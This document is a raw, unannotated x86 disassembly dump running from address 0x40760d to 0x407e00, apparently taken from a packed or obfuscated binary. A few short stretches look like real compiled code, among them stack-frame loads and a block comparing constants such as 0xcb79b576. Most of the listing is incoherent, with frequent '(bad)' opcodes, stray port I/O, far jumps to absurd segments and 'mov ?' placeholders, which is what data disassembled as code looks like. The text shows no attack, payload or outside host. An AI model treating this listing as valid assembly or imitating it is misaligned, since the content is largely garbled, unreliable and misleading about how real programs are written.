  40760d:	jae    0x407630
  40760f:	addr16 in al,dx
  407611:	ret    
  407612:	shl    BYTE PTR [ebx+ecx*1-0xede9924],0xa3
  40761a:	mov    esp,0xafba90c9
  40761f:	in     eax,0xa
  407621:	(bad)  
  407622:	jbe    0x4075c7
  407624:	daa    
  407625:	pop    esi
  407626:	fimul  WORD PTR [edi+0x3b]
  407629:	fs ds mov bh,0x2d
  40762d:	jns    0x4075b3
  40762f:	mov    cl,0xf9
  407631:	add    edx,DWORD PTR [esi+0x29]
  407634:	mov    eax,0xe79f5548
  407639:	inc    WORD PTR [ecx]
  40763c:	(bad)  
  40763d:	call   0xce39f880
  407642:	repz xchg esi,eax
  407644:	xchg   ebp,eax
  407645:	ror    ebp,cl
  407647:	iret   
  407648:	cwde   
  407649:	fcomp  DWORD PTR [ebx-0x16fb8177]
  40764f:	xchg   ebx,eax
  407650:	or     eax,0x458b0000
  407655:	fadd   QWORD PTR [ebx]
  407657:	inc    ebp
  407658:	cld    
  407659:	mov    DWORD PTR [ebp-0x28],eax
  40765c:	mov    eax,DWORD PTR [ebp-0x28]
  40765f:	mov    eax,DWORD PTR [ebp-0x4]
  407662:	mov    eax,DWORD PTR [ebp-0x28]
  407665:	mov    eax,DWORD PTR [eax+0xc]
  407668:	mov    edx,DWORD PTR [ebp-0x4]
  40766b:	movzx  eax,WORD PTR [edx+eax*1]
  40766f:	cdq    
  407670:	shld   edx,eax,0x2
  407674:	xor    edx,ecx
  407676:	mov    DWORD PTR [ebp+0xc],edx
  407679:	jmp    0x407a1a
  40767e:	sbb    BYTE PTR [edi-0x2f],cl
  407681:	pop    esi
  407682:	call   0x3e77:0x3eb7bc64
  407689:	fnsave [eax-0x1e]
  40768c:	mov    dh,0xa4
  40768e:	mov    esi,0xbdbebe57
  407693:	les    edi,FWORD PTR [esi-0x5599af42]
  407699:	xchg   ecx,eax
  40769a:	mov    edx,DWORD PTR [ebx]
  40769c:	out    dx,eax
  40769d:	jl     0x407636
  40769f:	aas    
  4076a0:	pop    ebx
  4076a1:	pop    esi
  4076a2:	int    0xeb
  4076a4:	arpl   WORD PTR [ecx+0x0],di
  4076a7:	fdivr  st,st(3)
  4076a9:	or     ecx,DWORD PTR [ebx+0x7c]
  4076ac:	stc    
  4076ad:	mov    edi,0xb866546a
  4076b2:	sbb    dh,0x35
  4076b5:	jg     0x407648
  4076b7:	mov    ch,0x41
  4076b9:	aas    
  4076ba:	dec    ebp
  4076bb:	clc    
  4076bc:	fmulp  st(5),st
  4076be:	inc    ecx
  4076bf:	pop    ecx
  4076c0:	push   cs
  4076c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076c2:	mov    dl,bh
  4076c4:	cmpxchg bh,cl
  4076c7:	rol    BYTE PTR ds:0x59e823a1,cl
  4076cd:	mov    edx,0xf6829469
  4076d2:	hlt    
  4076d3:	inc    ebp
  4076d4:	pop    ebx
  4076d5:	imul   ecx,DWORD PTR [eax+0x4a2367a4],0x7f
  4076dc:	jl     0x4076ef
  4076de:	mov    ebp,ebx
  4076e0:	out    0x4c,eax
  4076e2:	dec    ebx
  4076e3:	(bad)  
  4076e4:	mov    dl,0x4b
  4076e6:	or     DWORD PTR [ebx],ebx
  4076e8:	lea    eax,[eax]
  4076ea:	cmp    BYTE PTR [esi+0x557ee143],dl
  4076f0:	jne    0x40770b
  4076f2:	and    eax,0xd2310938
  4076f7:	sar    DWORD PTR [ebp-0x5ee351b4],1
  4076fd:	repnz test eax,0x41e69d1b
  407703:	(bad)  
  407704:	mov    dh,0x6e
  407706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407707:	shl    BYTE PTR [ebp-0x65],cl
  40770a:	test   eax,0xfafcb3c4
  40770f:	mov    eax,ds:0x8e1c6ebe
  407714:	mov    cl,0x57
  407716:	push   ss
  407717:	lods   eax,DWORD PTR ds:[esi]
  407718:	in     eax,dx
  407719:	fdivr  DWORD PTR [edi-0x668954a]
  40771f:	mov    ds:0x5025c849,eax
  407724:	out    dx,eax
  407725:	mov    al,0x35
  407727:	adc    DWORD PTR [eax-0x61ef681a],0x68
  40772e:	or     DWORD PTR [ebx+0x16bcf46b],ebx
  407734:	scas   eax,DWORD PTR es:[edi]
  407735:	xor    al,ah
  407737:	out    dx,eax
  407738:	or     BYTE PTR [edi+eiz*2+0x11c3f6d0],ch
  40773f:	pop    ecx
  407740:	sahf   
  407741:	daa    
  407742:	sbb    eax,0xd06752db
  407747:	shl    ebp,cl
  407749:	call   0xbde50177
  40774e:	dec    eax
  40774f:	call   0x3f07238b
  407754:	ds test dl,ch
  407757:	mov    ch,0xae
  407759:	std    
  40775a:	mov    edi,0x69244d39
  40775f:	xlat   BYTE PTR ds:[ebx]
  407760:	xchg   esi,eax
  407761:	mov    ebx,0x5f18f22d
  407766:	ret    
  407767:	push   ebx
  407768:	add    BYTE PTR [esi+edx*8],cl
  40776b:	hlt    
  40776c:	jle    0x40773f
  40776e:	das    
  40776f:	in     eax,dx
  407770:	stos   BYTE PTR es:[edi],al
  407771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407772:	mov    dh,0xee
  407774:	stos   BYTE PTR es:[edi],al
  407775:	xchg   edi,eax
  407776:	std    
  407777:	scas   al,BYTE PTR es:[edi]
  407778:	push   eax
  407779:	ds cli 
  40777b:	pop    ds
  40777c:	adc    ebx,DWORD PTR [eax+0x35]
  40777f:	and    bh,ch
  407781:	popf   
  407782:	mov    ebx,0x57587f2b
  407787:	inc    esp
  407788:	inc    eax
  407789:	out    dx,al
  40778a:	mov    ch,0xf7
  40778c:	jecxz  0x40777e
  40778e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40778f:	xchg   ecx,eax
  407790:	jnp    0x4077f4
  407792:	xchg   ecx,eax
  407793:	cmp    DWORD PTR [esi+0x38c3fb10],ecx
  407799:	mov    edx,0x4436e12e
  40779e:	mov    bh,0xb4
  4077a0:	adc    edi,DWORD PTR [edx+0x3d]
  4077a3:	mul    BYTE PTR [esi+0x4fbcc184]
  4077a9:	adc    bh,BYTE PTR [ecx+0x2a]
  4077ac:	cs mov edx,0x6e0fd9ac
  4077b2:	dec    ebp
  4077b3:	pop    DWORD PTR [esi+0x21b77a3d]
  4077b9:	xchg   ebp,eax
  4077ba:	or     DWORD PTR [edx-0x68db73b2],edx
  4077c0:	push   ss
  4077c1:	mov    ecx,0xfa13183d
  4077c6:	push   edx
  4077c7:	out    0xe,eax
  4077c9:	inc    ebp
  4077ca:	pop    ebp
  4077cb:	xchg   ebx,eax
  4077cc:	icebp  
  4077cd:	mov    ecx,0x73f7ecf5
  4077d2:	jge    0x40784f
  4077d4:	clc    
  4077d5:	inc    ebp
  4077d6:	sub    bh,bh
  4077d8:	mov    bh,0x99
  4077da:	sbb    DWORD PTR [edi-0x15114968],ebp
  4077e0:	xchg   ebp,eax
  4077e1:	pop    es
  4077e2:	xor    al,0x5b
  4077e4:	sahf   
  4077e5:	fwait
  4077e6:	jo     0x40777c
  4077e8:	adc    eax,0xed34b204
  4077ed:	mov    ebx,DWORD PTR [ebp+0x67]
  4077f0:	ror    DWORD PTR [edi+0x3f],1
  4077f3:	xchg   ebp,eax
  4077f4:	pop    ebp
  4077f5:	pop    esi
  4077f6:	push   ebx
  4077f7:	mov    bh,0x47
  4077f9:	lods   al,BYTE PTR ds:[esi]
  4077fa:	cmp    DWORD PTR [esi-0x76],0x9fd5b4ae
  407801:	dec    ebx
  407802:	jo     0x407793
  407804:	inc    esi
  407805:	jne    0x407878
  407807:	mov    dh,BYTE PTR [ebx+0x6]
  40780a:	add    ebp,eax
  40780c:	mov    bl,0xeb
  40780e:	aad    0x10
  407810:	xor    BYTE PTR [ebx],bh
  407812:	jnp    0x40787d
  407814:	in     eax,dx
  407815:	fstp   QWORD PTR ds:0x8ee11c51
  40781b:	jecxz  0x407818
  40781d:	sahf   
  40781e:	arpl   cx,cx
  407820:	add    esi,ebx
  407822:	and    eax,0x8ea28a79
  407827:	cdq    
  407828:	jne    0x4077f6
  40782a:	push   edi
  40782b:	jmp    0x43fa:0x8eae89a9
  407832:	push   ebp
  407833:	push   ebp
  407834:	dec    ecx
  407835:	sti    
  407836:	xor    al,0xda
  407839:	cdq    
  40783a:	cld    
  40783b:	clc    
  40783c:	into   
  40783d:	push   es
  40783e:	rcl    BYTE PTR [esi],0xd3
  407841:	mov    dh,0x70
  407843:	retf   0xb968
  407846:	cwde   
  407847:	pop    eax
  407848:	(bad)  
  40784a:	or     DWORD PTR [esi+0x600ca5b5],ebx
  407850:	not    BYTE PTR fs:[ecx-0x60b31075]
  407857:	adc    eax,0x309be7b0
  40785c:	inc    ebp
  40785d:	test   eax,0x7fe3501c
  407862:	xchg   ebx,eax
  407863:	stos   BYTE PTR es:[edi],al
  407864:	test   al,0x43
  407866:	xchg   DWORD PTR [ebp+0x1825fc98],edx
  40786c:	fcomp  QWORD PTR [ebx]
  40786e:	jbe    0x4078c6
  407870:	xchg   esp,eax
  407871:	add    DWORD PTR [edi],edi
  407873:	aaa    
  407874:	push   ebx
  407875:	and    bl,BYTE PTR [esi+0x3d6ddf9f]
  40787b:	cmp    al,0x28
  40787d:	push   0x2f
  40787f:	ja     0x4078ff
  407881:	in     al,dx
  407882:	inc    esi
  407883:	xor    eax,DWORD PTR [ebp+ebp*2-0x4cd60c14]
  40788a:	inc    eax
  40788b:	jo     0x407836
  40788d:	mov    bl,0xbb
  40788f:	shl    DWORD PTR [ebx+0x214d5e07],cl
  407895:	xchg   ebx,eax
  407896:	pusha  
  407897:	pop    ds
  407898:	xchg   esp,eax
  407899:	and    al,BYTE PTR [eax]
  40789b:	sbb    DWORD PTR [esi],ecx
  40789d:	xchg   BYTE PTR [ebx],bh
  40789f:	hlt    
  4078a0:	retf   
  4078a1:	test   BYTE PTR [esi],al
  4078a3:	inc    ecx
  4078a4:	(bad)  
  4078a5:	mov    cl,0x91
  4078a7:	clc    
  4078a8:	daa    
  4078a9:	imul   esp,DWORD PTR ss:[ecx+0x5e5b9506],0x6f
  4078b1:	fistp  DWORD PTR [ebx-0x4e]
  4078b4:	and    DWORD PTR [ebp-0x401789ab],edx
  4078ba:	bound  eax,QWORD PTR [esi]
  4078bc:	rcr    BYTE PTR ds:0x62bb4401,cl
  4078c2:	mov    DWORD PTR [ecx],esi
  4078c4:	ins    DWORD PTR es:[edi],dx
  4078c5:	add    DWORD PTR ds:0x1f781562,edi
  4078cb:	pop    eax
  4078cc:	out    dx,al
  4078cd:	bound  edi,QWORD PTR [ebx]
  4078cf:	mov    edx,0x5d35d993
  4078d4:	xlat   BYTE PTR ds:[ebx]
  4078d5:	repz retf 
  4078d7:	(bad)  
  4078d8:	jmp    0xd6ca:0xa32f85e1
  4078df:	clc    
  4078e0:	test   esi,esi
  4078e2:	push   esi
  4078e3:	in     al,0xe4
  4078e5:	loopne 0x4078cd
  4078e7:	leave  
  4078e8:	ss fdiv st,st(7)
  4078eb:	loop   0x407898
  4078ed:	mov    al,ds:0xaf22b377
  4078f2:	dec    edx
  4078f3:	aam    0xa3
  4078f5:	add    al,0x85
  4078f7:	leave  
  4078f8:	push   cs
  4078f9:	and    eax,0x861e9567
  4078fe:	add    ebp,DWORD PTR [esi-0x66]
  407901:	fsubr  DWORD PTR [ecx]
  407903:	xor    BYTE PTR [edi+0xa65215e],dh
  407909:	sbb    BYTE PTR [edi-0x51],0x9e
  40790d:	in     eax,0xc9
  40790f:	popf   
  407910:	(bad)  
  407911:	outs   dx,BYTE PTR ds:[esi]
  407912:	sbb    BYTE PTR [eax],0xdd
  407915:	or     dh,BYTE PTR [ebp+eax*2-0x5f854e3a]
  40791c:	jno    0x4078a1
  40791e:	ret    
  40791f:	push   cs
  407920:	ret    0x4c69
  407923:	rcr    DWORD PTR [ecx+0x38],1
  407926:	mov    DWORD PTR [ebx+0x38],esp
  407929:	inc    eax
  40792a:	fs mov ebp,ebx
  40792d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40792e:	inc    edx
  40792f:	push   0xf1e66c18
  407934:	push   ds
  407935:	ror    BYTE PTR [edi],1
  407937:	xor    ch,BYTE PTR [edi+0x71]
  40793a:	in     eax,dx
  40793b:	jb     0x407961
  40793d:	js     0x407966
  40793f:	call   0x7a35674a
  407944:	add    ebp,ebx
  407946:	adc    BYTE PTR ds:0x337e5f56,bl
  40794c:	test   BYTE PTR [ebp+0x4e],dh
  40794f:	xor    DWORD PTR [edx+0x741b4a0],ebx
  407955:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407956:	xor    BYTE PTR [ebx+ebx*8-0x3c1f4f75],dl
  40795d:	fadd   QWORD PTR [esi]
  40795f:	push   ss
  407960:	in     al,dx
  407961:	xor    BYTE PTR [eax*4-0xf1d14b5],al
  407968:	aas    
  407969:	mov    edx,0x4649d7ac
  40796e:	add    esp,DWORD PTR [ebx-0x182b2cfe]
  407974:	ret    
  407975:	(bad)  
  407976:	(bad)  
  407977:	das    
  407978:	dec    eax
  407979:	lock jo 0x407981
  40797c:	(bad)  [esi-0x1c]
  40797f:	stos   DWORD PTR es:[edi],eax
  407980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407981:	push   eax
  407982:	(bad)  
  407983:	fst    DWORD PTR [esi+0x6e]
  407986:	or     eax,0x83e085c9
  40798b:	movups xmm7,xmm0
  40798e:	or     DWORD PTR [ebp-0x47f39fc2],esi
  407994:	pop    edx
  407995:	push   esp
  407996:	mov    dl,0x6c
  407998:	mov    ?,WORD PTR [ebx+edx*1-0x13]
  40799c:	rcl    DWORD PTR [ebp-0x6a],cl
  40799f:	or     bl,BYTE PTR [ebp+ebp*2-0x31]
  4079a3:	xchg   esp,eax
  4079a4:	pop    edx
  4079a5:	loopne 0x4079b0
  4079a7:	xor    BYTE PTR [ebx-0x26],dl
  4079aa:	pop    edx
  4079ab:	xchg   ebp,eax
  4079ac:	mov    dh,0x5d
  4079ae:	shl    BYTE PTR [esi+0x193aaafc],0x35
  4079b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079b6:	test   al,0x29
  4079b8:	and    BYTE PTR [esi+edx*4-0xa2b3a0c],al
  4079bf:	mov    ah,0x82
  4079c1:	mov    esi,0xcdcb6c8e
  4079c6:	cmp    eax,0x13bb7280
  4079cb:	adc    edi,0xafaf4e20
  4079d1:	cld    
  4079d2:	test   eax,0x5553d758
  4079d7:	xchg   esi,eax
  4079d8:	daa    
  4079d9:	inc    esp
  4079da:	mov    dl,0xcf
  4079dc:	fld    st(7)
  4079de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079df:	mov    ds,WORD PTR [ebx]
  4079e1:	mov    bh,0x90
  4079e3:	retf   
  4079e4:	sti    
  4079e5:	fs (bad) 
  4079e7:	rcl    DWORD PTR [ebp+0x617cff4b],cl
  4079ed:	imul   ecx,DWORD PTR [eax-0x52f3030],0xae066b0
  4079f7:	push   ecx
  4079f8:	and    eax,0x920e7dd2
  4079fd:	jp     0x407a26
  4079ff:	cmp    eax,0x27deda13
  407a04:	mov    esp,0x3f78d054
  407a09:	xor    esp,ebp
  407a0b:	jo     0x407a78
  407a0d:	ins    DWORD PTR es:[edi],dx
  407a0e:	sub    eax,ebp
  407a10:	outs   dx,BYTE PTR ds:[esi]
  407a11:	mov    ebx,0x79a55e56
  407a16:	dec    edx
  407a17:	xchg   DWORD PTR [eax],esi
  407a19:	or     BYTE PTR [ebx-0x1f3e57ab],0x2
  407a20:	mov    DWORD PTR [ebp+0x10],edx
  407a23:	mov    edx,DWORD PTR [ebp-0x54]
  407a26:	xor    eax,0xcb79b576
  407a2b:	mov    DWORD PTR [ebp+0x14],edx
  407a2e:	cmp    eax,DWORD PTR [ebp+0x10]
  407a31:	jne    0x408352
  407a37:	mov    eax,edx
  407a39:	cmp    DWORD PTR [ebp+0xc],eax
  407a3c:	jne    0x408352
  407a42:	mov    DWORD PTR [ebp+0x8],0xcb79b576
  407a49:	mov    DWORD PTR [ebp+0xc],ecx
  407a4c:	mov    DWORD PTR [ebp-0x60],0xcb79b572
  407a53:	mov    DWORD PTR [ebp-0x5c],ecx
  407a56:	mov    DWORD PTR [ebp-0x48],0xcb79b57e
  407a5d:	mov    DWORD PTR [ebp-0x44],ecx
  407a60:	mov    DWORD PTR [ebp-0x38],0xcb79b57a
  407a67:	mov    DWORD PTR [ebp-0x34],ecx
  407a6a:	mov    eax,DWORD PTR [ebp+0x8]
  407a6d:	jmp    0x407e0e
  407a72:	cmp    eax,0x2444c2a4
  407a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a78:	inc    eax
  407a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a7a:	ret    0x7a7b
  407a7d:	xchg   edx,eax
  407a7e:	mov    edi,0xbde3d73a
  407a83:	pop    ebp
  407a84:	mov    esi,0xbec4bdbe
  407a89:	mov    esi,0x941d870e
  407a8e:	jno    0x407af2
  407a90:	icebp  
  407a91:	adc    BYTE PTR [edi],cl
  407a93:	fcom   DWORD PTR [esp+edx*8]
  407a96:	imul   edi,ecx,0x5378e983
  407a9c:	rcr    BYTE PTR [eax-0x250f84ec],1
  407aa2:	idiv   DWORD PTR [edx]
  407aa4:	out    0x34,al
  407aa6:	retf   
  407aa7:	mov    DWORD PTR [edi+ecx*2-0x48c12c00],0x990d59bb
  407ab2:	gs iret 
  407ab4:	sar    esi,0xec
  407ab7:	mov    al,0x15
  407ab9:	arpl   WORD PTR gs:[esp+eax*4],bp
  407abd:	sbb    ch,BYTE PTR [edx-0x75]
  407ac0:	int    0xd5
  407ac2:	mov    al,0x33
  407ac4:	nop
  407ac5:	ss jmp 0x3b8d:0xbc6c7fdf
  407acd:	hlt    
  407ace:	inc    ebx
  407acf:	hlt    
  407ad0:	xor    ah,BYTE PTR [esi]
  407ad2:	imul   esp,edx,0xb0640ca2
  407ad8:	mov    ebx,0x8b10ccaf
  407add:	xor    eax,0x68548dd
  407ae2:	inc    eax
  407ae3:	test   ch,0x7d
  407ae6:	push   ss
  407ae7:	mov    al,BYTE PTR [ebp+0x49fd362b]
  407aed:	stos   DWORD PTR es:[edi],eax
  407aee:	mul    BYTE PTR [edi+0x2f9f0cdf]
  407af4:	dec    eax
  407af5:	jp     0x407a78
  407af7:	sub    cl,BYTE PTR [ecx+eax*4-0x41]
  407afb:	rol    BYTE PTR [ebx],cl
  407afd:	jmp    0x407b5b
  407aff:	arpl   WORD PTR [esi+0x57],sp
  407b02:	push   esp
  407b03:	sub    BYTE PTR [ebx-0x2954fb3f],bh
  407b09:	and    BYTE PTR [edi],al
  407b0b:	lods   al,BYTE PTR ds:[esi]
  407b0c:	pop    ebp
  407b0d:	inc    ebx
  407b0e:	or     BYTE PTR [eax+ecx*8],0x64
  407b12:	sbb    al,0xf7
  407b14:	adc    al,0x2f
  407b16:	int3   
  407b17:	pushf  
  407b18:	data16 data16 cmp al,0x35
  407b1c:	jg     0x407aaa
  407b1e:	mov    DWORD PTR [edx-0x62],ecx
  407b21:	sbb    edi,DWORD PTR [edi+0x6679dc54]
  407b27:	push   DWORD PTR [edi]
  407b29:	xchg   edi,eax
  407b2a:	and    ecx,ebx
  407b2c:	jg     0x407b38
  407b2e:	mov    edx,DWORD PTR [ebp+0x72f7d954]
  407b34:	repnz mov ss,WORD PTR [edx]
  407b37:	icebp  
  407b38:	iret   
  407b39:	cmp    DWORD PTR [edi-0x1d],edx
  407b3c:	pop    ebx
  407b3d:	mov    bl,0xbd
  407b3f:	mov    ds:0xd3bc62b0,al
  407b44:	pop    ds
  407b45:	mov    dh,0x2e
  407b47:	pop    ebx
  407b48:	cmc    
  407b49:	cmp    DWORD PTR [edi+0x5866c2c0],ebx
  407b4f:	repz (bad) 
  407b51:	cld    
  407b52:	(bad)  
  407b53:	ins    BYTE PTR es:[edi],dx
  407b54:	pop    eax
  407b55:	pop    ss
  407b56:	lock mov dh,bl
  407b59:	cld    
  407b5a:	enter  0xd345,0x12
  407b5e:	xor    esp,DWORD PTR [ecx]
  407b60:	es int3 
  407b62:	mov    ds:0xe219f6e7,al
  407b67:	inc    edx
  407b68:	xchg   esp,eax
  407b69:	cwde   
  407b6a:	in     eax,0x8d
  407b6c:	(bad)  [ebx]
  407b6e:	xor    DWORD PTR [edx-0x88e0008],ecx
  407b74:	js     0x407ba7
  407b76:	sbb    DWORD PTR [ebx-0x1d],esi
  407b79:	mov    al,ds:0x7e7b1f9d
  407b7e:	mov    WORD PTR [esi+0x8],?
  407b81:	inc    edx
  407b82:	adc    DWORD PTR [eax+0xd83bac9],esp
  407b88:	mov    ah,0xec
  407b8a:	jge    0x407bfb
  407b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b8d:	pop    es
  407b8e:	out    dx,eax
  407b8f:	push   cs
  407b90:	shl    BYTE PTR [eax],cl
  407b92:	dec    DWORD PTR [ecx+0x6c]
  407b95:	test   eax,0x894d3493
  407b9a:	and    bh,BYTE PTR [eax-0x7a36523a]
  407ba0:	in     al,dx
  407ba1:	pop    es
  407ba2:	adc    al,BYTE PTR [ebx+ebx*1+0x68967f27]
  407ba9:	sub    al,0xf
  407bab:	rcr    DWORD PTR [ebx],1
  407bad:	xor    BYTE PTR [ecx+0x9eaad66],ah
  407bb3:	mov    si,WORD PTR [eax+edi*2-0x77ad6015]
  407bbb:	sub    bh,BYTE PTR [edi-0x22]
  407bbe:	push   ds
  407bbf:	add    eax,0x159f600c
  407bc4:	js     0x407c0e
  407bc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bc7:	loop   0x407b5b
  407bc9:	push   esp
  407bca:	push   ebx
  407bcb:	and    eax,0x9d30aabb
  407bd0:	test   BYTE PTR [edx],0xb1
  407bd3:	sbb    eax,0x1674b282
  407bd8:	mov    ch,0x6c
  407bda:	add    eax,0x316b7455
  407bdf:	xchg   esp,eax
  407be0:	shl    edx,cl
  407be2:	jmp    0xc8e1235c
  407be7:	mov    ebx,0x23b644a7
  407bec:	add    ebp,DWORD PTR [edi-0x23127c8a]
  407bf2:	xchg   ecx,eax
  407bf3:	push   ecx
  407bf4:	push   ss
  407bf5:	add    DWORD PTR [esi],ecx
  407bf7:	scas   eax,DWORD PTR es:[edi]
  407bf8:	stos   DWORD PTR es:[edi],eax
  407bf9:	cwde   
  407bfa:	mov    ebp,?
  407bfc:	popf   
  407bfd:	(bad)  
  407bff:	mov    WORD PTR [ebp*2+0x685edf3a],ds
  407c06:	jl     0x407bf1
  407c08:	jl     0x407c6c
  407c0a:	mov    ds:0x5cc25abf,eax
  407c0f:	xor    BYTE PTR [edx-0x42],bh
  407c12:	ficom  DWORD PTR [eax]
  407c14:	mov    cl,0x82
  407c16:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  407c18:	ja     0x407c23
  407c1a:	iret   
  407c1b:	add    al,bl
  407c1d:	(bad)  
  407c1e:	fcom   DWORD PTR [ecx-0x29f510d3]
  407c24:	and    al,0x41
  407c26:	push   di
  407c28:	retf   0x375f
  407c2b:	nop
  407c2c:	mov    cl,0x24
  407c2e:	into   
  407c2f:	or     ah,dl
  407c31:	in     eax,dx
  407c32:	or     edx,DWORD PTR [edi+0x4cb2acaa]
  407c38:	les    ecx,FWORD PTR ds:0x1bfd7ae7
  407c3e:	fucom  st(6)
  407c40:	aad    0x40
  407c42:	sub    al,BYTE PTR [esi+0x38]
  407c45:	sbb    ebx,DWORD PTR [ebx+0x128546dc]
  407c4b:	iret   
  407c4c:	xor    DWORD PTR [esi-0xba2d334],edi
  407c52:	inc    ebp
  407c53:	fisub  DWORD PTR [ecx-0x7c]
  407c56:	cmp    eax,0xd6f19c29
  407c5b:	ds adc al,0xe
  407c5e:	adc    esp,esp
  407c60:	mov    dh,0x5e
  407c62:	addr16 xchg ebp,eax
  407c64:	or     bh,BYTE PTR [edx+0x3]
  407c67:	push   ss
  407c68:	mov    esi,0xc7b1d74c
  407c6d:	or     eax,0xc501a5da
  407c72:	and    eax,0xbcd2e6f2
  407c77:	inc    esp
  407c78:	cmp    al,BYTE PTR [ecx+0x2a]
  407c7b:	popa   
  407c7c:	xlat   BYTE PTR ds:[ebx]
  407c7d:	and    DWORD PTR [esi-0x6152c6a0],0x29bf0760
  407c87:	(bad)  
  407c88:	push   ebp
  407c89:	jo     0x407c31
  407c8b:	adc    BYTE PTR [esi+0x15],dl
  407c8e:	in     al,0xed
  407c90:	imul   edx,edi,0xffffffde
  407c93:	sar    DWORD PTR [ebp+0x28],cl
  407c96:	lds    edx,FWORD PTR [esi+0x28]
  407c99:	inc    esp
  407c9a:	cmc    
  407c9b:	jo     0x407c9b
  407c9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c9e:	jg     0x407d12
  407ca0:	ja     0x407c72
  407ca2:	jle    0x407c87
  407ca4:	cmp    eax,0x2c686c24
  407ca9:	adc    ebp,DWORD PTR [ebp-0x2a]
  407cac:	jno    0x407c85
  407cae:	sahf   
  407caf:	mov    dl,0xaa
  407cb1:	dec    edx
  407cb2:	jmp    0x4962e4e1
  407cb7:	mov    ah,0x4e
  407cb9:	mov    al,gs:0xb5428601
  407cbf:	and    al,0x53
  407cc1:	fimul  DWORD PTR [edi]
  407cc3:	imul   BYTE PTR gs:[ecx-0x779edbe3]
  407cca:	cmp    cl,BYTE PTR [esi-0x26]
  407ccd:	cli    
  407cce:	cmc    
  407ccf:	imul   ebx,eax,0xfb462f52
  407cd5:	fist   WORD PTR [ebp+0x5a47690a]
  407cdb:	and    ebx,DWORD PTR [edx+0x125609bf]
  407ce1:	out    dx,al
  407ce2:	lock js 0x407ccb
  407ce5:	sub    DWORD PTR [ecx-0x439b9cc5],ebx
  407ceb:	neg    bh
  407ced:	or     eax,0x799aac8f
  407cf2:	ret    
  407cf3:	push   esp
  407cf4:	pop    ebp
  407cf5:	lods   eax,DWORD PTR ds:[esi]
  407cf6:	push   cs
  407cf7:	cli    
  407cf8:	xchg   ebp,eax
  407cf9:	pushf  
  407cfa:	xchg   esp,eax
  407cfb:	mov    eax,ds:0xf88e33
  407d00:	mov    cl,0xf4
  407d02:	lds    edi,FWORD PTR [esi+0x345b3961]
  407d08:	lock inc edi
  407d0a:	sub    eax,0xf8c9963e
  407d0f:	inc    ebp
  407d10:	or     esi,DWORD PTR [eax+0x60]
  407d13:	mov    al,0xec
  407d15:	test   eax,0xe6a3f41f
  407d1a:	and    esp,DWORD PTR [ecx]
  407d1c:	jecxz  0x407d0b
  407d1e:	cwde   
  407d1f:	in     al,dx
  407d20:	mov    eax,ds:0x66ccaf6e
  407d25:	fsub   DWORD PTR [edx+0x1cb5ab11]
  407d2b:	and    bh,al
  407d2d:	shl    esp,0xb2
  407d30:	je     0x407d5f
  407d32:	out    0xfb,al
  407d34:	mov    ch,0x1d
  407d36:	call   FWORD PTR [edx+0xc]
  407d39:	or     ah,bh
  407d3b:	adc    ebp,0xc0ccbf43
  407d41:	addr16 xchg ebx,esi
  407d44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d45:	xchg   esi,eax
  407d46:	jbe    0x407d5b
  407d48:	les    ebp,FWORD PTR [eax-0x699b979d]
  407d4e:	cs nop
  407d50:	inc    esi
  407d51:	inc    eax
  407d52:	ret    
  407d53:	repnz push 0x5b92f2f4
  407d59:	sub    DWORD PTR [edi-0x18],eax
  407d5c:	sbb    ebp,eax
  407d5e:	or     ebp,DWORD PTR [ebx+0x30]
  407d61:	xchg   ebx,eax
  407d62:	inc    eax
  407d63:	popa   
  407d64:	jmp    0x2604:0x42089c89
  407d6b:	pop    ss
  407d6c:	adc    eax,0xce7267f
  407d71:	stc    
  407d72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d73:	test   eax,0xf28e5aa9
  407d78:	ja     0x407d07
  407d7a:	pop    ebp
  407d7b:	cmp    DWORD PTR [edx+ebx*2-0x1105197f],ecx
  407d82:	mov    WORD PTR [edx-0x14],?
  407d85:	mov    esi,DWORD PTR [ebx]
  407d87:	push   eax
  407d88:	push   edx
  407d89:	ja     0x407d9d
  407d8b:	push   ds
  407d8c:	retf   0xb4c4
  407d8f:	test   BYTE PTR [ebx-0x70],ch
  407d92:	cmp    eax,0x14fab407
  407d97:	call   FWORD PTR ds:0x75696d15
  407d9d:	sbb    dl,bh
  407d9f:	daa    
  407da0:	pop    ds
  407da1:	xchg   ebx,eax
  407da2:	(bad)  
  407da3:	test   eax,0x63b3e855
  407da8:	jl     0x407db6
  407daa:	nop
  407dab:	iret   
  407dac:	imul   edx,ebp,0x65ec22f0
  407db2:	shl    esi,1
  407db4:	cs inc esp
  407db6:	(bad)  
  407db8:	cmp    DWORD PTR gs:[ecx],eax
  407dbb:	in     eax,dx
  407dbc:	push   ebp
  407dbd:	inc    ebp
  407dbe:	das    
  407dbf:	and    DWORD PTR [ebp-0x58c1e540],esi
  407dc5:	add    eax,0x3afb4435
  407dca:	mov    dl,0x48
  407dcc:	pop    es
  407dcd:	mov    ecx,0x738317c1
  407dd2:	adc    edx,edx
  407dd4:	jle    0x407e35
  407dd6:	or     DWORD PTR [eax+edi*8-0x150d7bcb],edi
  407ddd:	inc    ebp
  407dde:	pop    edi
  407ddf:	push   edi
  407de0:	mov    edi,0x51055777
  407de5:	adc    BYTE PTR [edx],dl
  407de7:	aad    0x28
  407de9:	mov    al,ds:0xf09ad24d
  407dee:	push   ds
  407def:	mov    cl,0x1d
  407df1:	inc    esi
  407df2:	add    ch,BYTE PTR [eax+0x200f5406]
  407df8:	or     DWORD PTR [ebx-0x3624c3cb],esp
  407dfe:	das    
  407dff:	icebp  
  407e00:	xlat   BYTE PTR ds:[ebx]
